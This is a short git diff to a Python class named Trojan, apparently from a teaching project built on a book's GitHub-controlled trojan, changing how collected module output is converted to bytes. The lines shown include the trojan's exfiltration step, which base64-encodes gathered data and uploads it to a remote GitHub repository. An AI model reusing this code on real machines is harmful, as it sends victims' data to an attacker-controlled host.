@@ -48,7 +48,7 @@ class Trojan:
     def store_module_result(self, data):
         message = datetime.now().isoformat()
         remote_path = f'bhptrojan/data/{self.idx}/{message}.data'
-        bindata = bytes('%r' % data, 'utf-8')
+        bindata = bytes(str(data), 'utf-8')
         self.repo.create_file(
             remote_path, message, base64.b64encode(bindata)
         )
